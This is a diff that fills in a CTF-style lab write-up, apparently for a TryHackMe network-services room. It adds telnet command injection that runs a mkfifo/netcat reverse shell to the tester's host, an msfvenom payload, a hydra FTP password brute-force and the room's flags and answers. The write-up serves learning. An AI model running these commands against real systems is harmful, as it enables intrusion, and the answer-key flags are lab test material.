@@ -186,7 +186,7 @@ nmap -sC -sV -oN nmap/initial2_part2 -p- 10.10.222.51
 ## Task 7
 
 ```shell
-telnet 10.10.222.51 8012
+telnet 10.10.188.182 8012
 ```
 
 ### Task 7.2
@@ -209,7 +209,7 @@ sudo tcpdump ip proto \\icmp -i tun0
 ```
 
 ```shell
-	.RUN ping 10.10.107.46 -c 1
+	.RUN ping 10.14.27.197 -c 1
 ```
 
 > Y
@@ -217,70 +217,123 @@ sudo tcpdump ip proto \\icmp -i tun0
 ### Task 7.8
 
 ```shell
-	.RUN msfvenom -p cmd/unix/reverse_netcat lhost=10.10.107.46 lport=9876 R
+msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=9876 R
 ```
 
 > mkfifo
 
 ### Task 7.9
 
-> 
+```shell
+nc -lvp 9876
+```
+
+> nc -lvp 4444
 
 ### Task 7.11
 
-> 
+```shell
+	.RUN mkfifo /tmp/tjkhssk; nc 10.14.27.197 9876 0</tmp/tjkhssk | /bin/sh >/tmp/tjkhssk 2>&1; rm /tmp/tjkhssk
+```
+
+```shell
+nc:
+	ls
+	cat flag.txt
+```
+
+> THM{y0u_g0t_th3_t3ln3t_fl4g}
 
 <br>
 
 ## Task 8
 
+https://www.ietf.org/rfc/rfc959.txt
+
 ### Task 8.1
 
-> 
+> client-server
 
 ### Task 8.2
 
-> 
+> 21
 
 ### Task 8.3
 
-> 
+> 2
 
 <br>
 
 ## Task 9
 
+https://www.exploit-db.com/exploits/20745
+
 ### Task 9.1
 
-> 
+```shell
+nmap -sC -sV -oN nmap/initial3 -p- 10.10.66.175
+
+nmap -sV -oN nmap/initial3_part2 -p- 10.10.66.175
+```
+
+> 2
 
 ### Task 9.2
 
-> 
+> 21
 
 ### Task 9.3
 
-> 
+> vsftpd
 
 ### Task 9.4
 
-> 
+```shell
+ftp 10.10.66.175
+	anonymous
+	
+	ls
+```
+
+> PUBLIC_NOTICE.txt
 
 ### Task 9.5
 
-> 
+```shell
+	more PUBLIC_NOTICE.txt
+	q
+```
+
+> Mike
 
 <br>
 
 ## Task 10
 
+https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP
+
 ### Task 10.1
 
-> 
+```shell
+hydra -t 4 -l mike -P ../../Tools/KaliWordlists/rockyou.txt -vV 10.10.66.175 ftp
+```
+
+> password
 
 ### Task 10.3
 
-> 
+```shell
+	bye
+ftp 10.10.66.175
+	mike
+	password
+	
+	ls
+	more ftp.txt
+	q
+```
+
+> THM{y0u_g0t_th3_ftp_fl4g}
 
 <br>
 
